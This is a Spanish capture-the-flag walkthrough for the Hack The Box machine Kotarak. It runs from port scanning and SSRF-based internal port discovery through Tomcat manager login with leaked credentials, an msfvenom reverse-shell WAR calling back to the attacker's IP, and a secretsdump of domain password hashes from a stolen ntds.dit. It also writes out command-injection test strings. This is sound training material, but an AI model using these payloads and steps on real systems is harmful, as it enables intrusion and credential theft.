@@ -1,0 +1,1172 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Kotarak - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Kotarak en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Kotarak">
+<meta property="og:url" content="http://localhost:4000/htb-kotarak/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Kotarak en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-kotarak/kotarak.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-10-19T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-kotarak/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Kotarak</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Kotarak">
+    <meta itemprop="description" content="Resolución de la máquina Kotarak en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="October 19, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Kotarak
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-19T00:00:00-05:00">October 19, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-kotarak/banner-kotarak.jpg" alt="" /></p>
+
+<h2 id="kotarak">Kotarak</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.55.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.55
+PING 10.10.10.55 <span class="o">(</span>10.10.10.55<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.55: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>139 ms
+
+<span class="nt">---</span> 10.10.10.55 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 138.748/138.748/138.748/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.55 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 22:22 CDT
+Initiating Ping Scan at 22:22
+Scanning 10.10.10.55 <span class="o">[</span>4 ports]
+Completed Ping Scan at 22:22, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 22:22
+Scanning 10.10.10.55 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.55
+Discovered open port 8080/tcp on 10.10.10.55
+Discovered open port 60000/tcp on 10.10.10.55
+Discovered open port 8009/tcp on 10.10.10.55
+Completed SYN Stealth Scan at 22:23, 37.70s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.55
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65531 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+8009/tcp  open  ajp13
+8080/tcp  open  http-proxy
+60000/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>38.02 seconds
+           Raw packets sent: 69274 <span class="o">(</span>3.048MB<span class="o">)</span> | Rcvd: 69271 <span class="o">(</span>2.771MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.55
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,8009,8080,60000
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,8009,8080,60000 10.10.10.55 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 22:23 CDT
+Nmap scan report <span class="k">for </span>10.10.10.55
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 <span class="o">(</span>ED25519<span class="o">)</span>
+8009/tcp  open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
+| ajp-methods: 
+|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
+|   Potentially risky methods: PUT DELETE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp  open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/8.5.5 - Error report
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+60000/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title:         Kotarak Web Hosting        
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.40 seconds
+</code></pre></div></div>
+
+<p>Vemos varios puertos que presentan el servicio HTTP, así que vamos a echarles un ojo, primeramente con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.55:8080/
+http://10.10.10.55:8080/ <span class="o">[</span>404 Not Found] Apache-Tomcat[8.5.5], Content-Language[en], Country[RESERVED][ZZ], HTML5, IP[10.10.10.55], Title[Apache Tomcat/8.5.5 - Error report]
+❯ whatweb http://10.10.10.55:60000/
+http://10.10.10.55:60000/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.55], Title[Kotarak Web Hosting][Title element contains newline<span class="o">(</span>s<span class="o">)!]</span>
+</code></pre></div></div>
+
+<p>Comenzaremos a observa primero el contenido del servidor HTTP por el puerto 60000, ya que es un puerto muy alto y raro para utilizar un sitio web.</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-web.png" alt="" /></p>
+
+<p>De acuerdo con la descripción, tenemos que el sitio es un buscador privado, lo que nos hace pensar que puede mostrarnos el contenido web de algun sitio; sólo para probar vamos a ver que pasa si introduccimos el mismo sitio, es decir, <code class="language-plaintext highlighter-rouge">http://10.10.10.55:60000/</code>:</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-web1.png" alt="" /></p>
+
+<p>Vemos que la dirección URL llama al recurso <code class="language-plaintext highlighter-rouge">url.php</code> y hace uso del parámetro <code class="language-plaintext highlighter-rouge">path</code>. A este punto, podemos hacer pruebas modificando el valor de <code class="language-plaintext highlighter-rouge">path</code> para ver que pasa. Podríamos tratar de inyectar comandos como por ejemplo:</p>
+
+<ul>
+  <li>http://localhost:60000/; whoami</li>
+  <li>http://localhost:60000/ &amp;&amp; whoami</li>
+  <li>http://localhost:60000/ || whoami</li>
+</ul>
+
+<p>Sin embargo, no obtenemos resultados. Vamos a probar si podemos ver archivos de nuestra máquina de atacante; así que nos creamos un archivo de prueba:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+        system<span class="o">(</span><span class="s2">"whoami"</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python y tratamos de ver su contenido por el sitio web de la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.16/test.php
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.55 - - <span class="o">[</span>19/Oct/2021 14:22:56] <span class="s2">"GET /test.php HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-test.png" alt="" /></p>
+
+<p>No vemos nada. Asi que vamos a tratar se ver si podemos ver puertos abiertos internos en la máquina, podriamos tratar con el puerto 22 que sabemos que se encuentra abierto:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:22
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-ssh.png" alt="" /></p>
+
+<p>Vemos la cabecera del servicio SSH, por lo que vamos a tratar de descubrir puertos internos abiertos en la máquina víctima, los primeros 1000; así que nos vamos a crear un pequeño programa en python:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding: utf-8
+</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">signal</span>
+
+<span class="c1"># Ctrl + c
+</span><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] El puerto {} está abierto"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.55:60000/url.php?path=http</span><span class="si">%3</span><span class="s">A</span><span class="si">%2</span><span class="s">F</span><span class="si">%2</span><span class="s">Flocalhost</span><span class="si">%3</span><span class="s">A"</span>
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+        <span class="n">uri</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">makeRequest</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+        <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 port-discovery.py
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 22 está abierto
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 90 está abierto
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 110 está abierto
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 320 está abierto
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 200 está abierto
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> El puerto 888 está abierto
+</code></pre></div></div>
+
+<p>Si validamos los puertos vía web, tenemos algo interesante para el puerto 888:</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-888.png" alt="" /></p>
+
+<p>A este punto, ya nos debe estar llamando la atención el recurso <code class="language-plaintext highlighter-rouge">backup</code>. Si hacemos <em>hovering</em>, vemos <code class="language-plaintext highlighter-rouge">doc=backup</code>; debido a que estamos viendo contenido interno del servidor (<em>SSRF - Server Side Request Forgery</em>), tenemos que agregar dicho parámetro en la dirección URL completa, es decir:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.55:60000/url.php?path<span class="o">=</span>http://localhost:888/?doc<span class="o">=</span>backup
+</code></pre></div></div>
+
+<p>No vemos nada; sin embargo, si accedemos al código fuente del sitio, tenemos lo siguiente:</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-fuente.png" alt="" /></p>
+
+<p>Tenemos unas credenciales, posiblemente de acceso a un portal de login de <strong>Apache Tomcat</strong>. Las guardamos y debemos recordar que se tiene el puerto 8080, así que vamos a echarle un ojo:</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-tomcat.png" alt="" /></p>
+
+<p>El servicio está asociado a <strong>Apache Tomcat 8.5.5</strong>; por lo que ya debemos saber que debe de existir el recurso <code class="language-plaintext highlighter-rouge">manager/html</code> en donde se encuentra el panel de login.</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-login.png" alt="" /></p>
+
+<p>Introducimos las credenciales que obtuvimos y estamos dentro del panel de administración.</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-panel.png" alt="" /></p>
+
+<p>Para poder ingresar a la máquina, ya debemos saber que necesitamos crear un archivo de extensión <code class="language-plaintext highlighter-rouge">war</code> y subirlo a la máquina (<strong>Nota</strong>: El archivo se sube en la parte donde se indica “Archivo WAR a desplegar”).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.16 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> shell.war
+Payload size: 1096 bytes
+Final size of war file: 1096 bytes
+Saved as: shell.war
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-war.png" alt="" /></p>
+
+<p>Nos ponemos en escucha por el puerto 443 y le damos click en nuestro archivo <code class="language-plaintext highlighter-rouge">/shell</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.55] 49290
+<span class="nb">whoami
+</span>tomcat
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos. Para este caso, vamos a tener un detalle al ejecutar el comando <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code> que no nos arroja una pseudo consola así que vamos a utilizar el comando <code class="language-plaintext highlighter-rouge">whereis python</code> para ver que versiones de python cuenta la máquina víctima y posterior ejecutamos <code class="language-plaintext highlighter-rouge">python3.5 -c 'import pty; pty.spawn("/bin/bash")'</code> para tener ahora si una pseudo consola (<strong>Nota</strong>: En caso de que no se nos cree la pseudo consola, ejecutar nuevamente el comando) y proseguimos con el tratamiento de la tty.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+Script <span class="k">done</span>, file is /dev/null
+
+whereis python
+python: /usr/bin/python3.5 /usr/bin/python2.7-config /usr/bin/python3.5m /usr/bin/python2.7 /usr/bin/python /usr/lib/python3.5 /usr/lib/python2.7 /etc/python3.5 /etc/python2.7 /etc/python /usr/local/lib/python3.5 /usr/local/lib/python2.7 /usr/include/python2.7 /usr/share/python /usr/share/man/man1/python.1.gz
+
+python3.5 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+tomcat@kotarak-dmz:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Tenemos en el directorio <code class="language-plaintext highlighter-rouge">/home/tomcat/to_archive/pentest_data</code> recursos interesantes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 28304
+<span class="nt">-rw-r--r--</span> 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+<span class="nt">-rw-r--r--</span> 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Buscando un poco, los archivos hacen referencia a los datos obtenidos de un pentest asocido a un dominio con <em>Active Directory</em>. Asi que vamos vamos a traerlos a nuestra máquina de atacante compartiendo un servidor con python desde la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.14.16 - - <span class="o">[</span>19/Oct/2021 16:57:45] <span class="s2">"GET /20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit HTTP/1.1"</span> 200 -
+10.10.14.16 - - <span class="o">[</span>19/Oct/2021 16:57:59] <span class="s2">"GET /20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://10.10.10.55:8000/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+<span class="nt">--2021-10-19</span> 15:52:55--  http://10.10.10.55:8000/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+Conectando con 10.10.10.55:8000... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 16793600 <span class="o">(</span>16M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Grabando a: «20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit»
+
+20170721114636_default_192.168.1 100%[<span class="o">=======================================================&gt;]</span>  16.02M  4.79MB/s    en 3.6s    
+
+2021-10-19 15:52:59 <span class="o">(</span>4.43 MB/s<span class="o">)</span> - «20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit» guardado <span class="o">[</span>16793600/16793600]
+
+❯ wget http://10.10.10.55:8000/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+<span class="nt">--2021-10-19</span> 15:53:09--  http://10.10.10.55:8000/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+Conectando con 10.10.10.55:8000... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 12189696 <span class="o">(</span>12M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Grabando a: «20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin»
+
+20170721114637_default_192.168.1 100%[<span class="o">=======================================================&gt;]</span>  11.62M  3.69MB/s    en 3.2s    
+
+2021-10-19 15:53:13 <span class="o">(</span>3.69 MB/s<span class="o">)</span> - «20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin» guardado <span class="o">[</span>12189696/12189696]
+
+❯ <span class="nb">mv </span>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit ntds.dit
+❯ <span class="nb">mv </span>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin system.bin
+</code></pre></div></div>
+
+<p>Antes de cualquier cosa, vamos a validar la integridad de la información:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="nv">$ </span><span class="nb">md5sum</span> <span class="k">*</span>
+f6849066d0e179ca24078906f5c5ee01  20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+f41191f7536a19abefa557c419bf5281  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">md5sum</span> <span class="k">*</span>
+f6849066d0e179ca24078906f5c5ee01  ntds.dit
+f41191f7536a19abefa557c419bf5281  system.bin
+</code></pre></div></div>
+
+<p>Y ahora si, con la herramienta <code class="language-plaintext highlighter-rouge">secretsdump</code> vamos a tratar de obtener la información de dichos archivos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-secretsdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system.bin LOCAL
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation     
+                                                                
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>                                                                    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient           
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff                     </span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit                                                                                  
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::    
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+WIN-3G2B0H151AC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
